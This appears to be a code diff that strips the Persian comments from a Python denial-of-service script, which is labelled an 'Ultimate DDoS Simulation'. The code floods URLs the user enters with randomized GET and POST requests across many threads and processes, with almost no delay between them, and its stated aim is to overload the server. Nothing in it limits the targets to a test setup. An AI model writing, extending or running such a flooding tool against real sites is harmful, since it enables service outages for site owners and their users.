@@ -9,7 +9,7 @@ import sys
 import os
 import multiprocessing
 
-# راه‌اندازی colorama
+
 init()
 ua = UserAgent()
 request_count = 0
@@ -19,7 +19,7 @@ lock = threading.Lock()
 stop_attack = False
 
 def send_heavy_request(urls):
-    """ارسال درخواست سنگین به چندین URL برای فشار آوردن به سرور"""
+    
     global request_count, success_count, fail_count
     headers = {
         "User-Agent": ua.random,
@@ -28,7 +28,7 @@ def send_heavy_request(urls):
         "Connection": "keep-alive"
     }
     try:
-        # انتخاب تصادفی یه URL از لیست
+        
         url = random.choice(urls)
         method = random.choice(["GET", "POST"])
         if method == "GET":
@@ -49,7 +49,7 @@ def send_heavy_request(urls):
             print(Fore.RED + f"[-] Request {request_count} Failed: {e}")
 
 def attack_worker(urls, threads, duration):
-    """تابع کارگر برای هر پروسس"""
+
     global stop_attack
     start_time = time.time()
 
@@ -58,7 +58,7 @@ def attack_worker(urls, threads, duration):
         thread = threading.Thread(target=send_heavy_request, args=(urls,))
         threads_list.append(thread)
         thread.start()
-        time.sleep(0.0001)  # فاصله خیلی کم برای فشار حداکثری
+        time.sleep(0.0001) 
 
     while time.time() - start_time < duration and not stop_attack:
         elapsed = time.time() - start_time
@@ -71,7 +71,7 @@ def attack_worker(urls, threads, duration):
         thread.join()
 
 def start_ddos_attack(urls, threads, duration, workers):
-    """شروع حمله با چندین پروسس"""
+    
     global stop_attack
     print(Fore.YELLOW + Style.BRIGHT + "[*] Launching Extreme DDoS Simulation on VPS...")
     print(Fore.RED + Style.BRIGHT + f"[!] Warning: Using {workers} workers with {threads} threads each to overload the server!")
@@ -84,7 +84,6 @@ def start_ddos_attack(urls, threads, duration, workers):
 
     signal.signal(signal.SIGINT, signal_handler)
 
-    # ایجاد چندین پروسس برای شبیه‌سازی حمله توزیع‌شده
     processes = []
     for _ in range(workers):
         p = multiprocessing.Process(target=attack_worker, args=(urls, threads, duration))
@@ -101,7 +100,6 @@ if __name__ == "__main__":
     os.system("cls" if os.name == "nt" else "clear")
     print(Fore.WHITE + Style.BRIGHT + "\n=== Ultimate DDoS Simulation by [Your Name] ===")
     
-    # دریافت چندین URL برای هدف قرار دادن
     print(Fore.WHITE + "Enter Target URLs (one per line, press Enter twice to finish):")
     urls = []
     while True:
